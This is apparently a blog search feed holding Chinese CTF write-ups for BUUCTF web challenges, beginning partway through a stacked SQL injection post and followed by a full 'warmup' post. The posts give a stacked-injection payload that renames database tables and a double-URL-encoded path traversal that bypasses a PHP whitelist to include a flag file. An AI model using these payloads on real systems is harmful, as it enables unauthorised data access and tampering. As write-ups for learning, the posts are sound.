alt=""><br>可以看到这个表里面有我们需要的flag<br>那么该如何获取flag呢</p><p>我们可以将words表改成另外一个名字，然后将1919810931114514表改为words，这样的话，我们只需要查询words表就能得到flag<br>payload如下</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;alter table words rename to word;alter table `1919810931114514` rename to words;alter table words change flag data varchar(100);alter table words add column id int(10)--+</span></code></pre><p>注：这里要注意几个问题：</p><pre><code>对列名进行更改时，要在后面指定修改后的数据类型添加id列时，设置默认值，方便后面查询</code></pre><p>执行完payload后，然后再查询1’ and ‘1’=’1就可以得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> 修改表名和列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-warmup/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>代码审计题目<br>查看源代码，发现提示</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--source.php--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问source.php</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> </code></pre><p>代码审计<br>有一个checkFile方法，规定了白名单</p><pre class=" language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>白名单内有一个hint.php，访问一下</p><pre class=" language-bash"><code class="language-bash">flag not here, and flag <span class="token keyword">in</span> ffffllllaaaagggg</code></pre><p>得到这样的提示，再继续审计代码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>需要设定page参数并且page要是字符</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>mb_substr是截取字符串的函数，mb_strpos函数则找出字符第一次出现的地方<br>所以上面代码的作用就是，截取page到？第一次出现的地方</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span></code></pre><p>如果截取之后的_page在白名单内则返回真<br>第一次截取之后再对page进行一次url解码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>解码之后在对其进行同样的截取操作<br>同样的，如果截取到的_page在白名单内则返回真</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  </code></pre><p>这一块代码的含义是，如果我们设定了file参数，并且满足file参数是字符串和checkfile方法，就进行文件包含，否则就返回一开始我们见到的那个滑稽<br>审计完了代码，我们需要理清思路<br>1.flag在ffffllllaaaagggg里面<br>2.我们的file要有白名单内的文件<br>3.两次解码(服务器本身就会进行一次url解码，后端又进行一次解码)后依然要满足checkfile方法<br>基于这些要求，我们就能够造出payload</p><pre class=" language-bash"><code class="language-bash">http://2bd8af98-1fcf-46ca-9780-c09e216ffb5e.node3.buuoj.cn/?file<span class="token operator">=</span>source.php%253f<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/ffffllllaaaagggg</code></pre><p>?经过两次url编码之后是%253f，后面的../是用来进行目录穿越的<br>访问一下就能得到flag<br>flag{540b1ff4-daf1-472a-8d21-0a0c9a36884b} </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
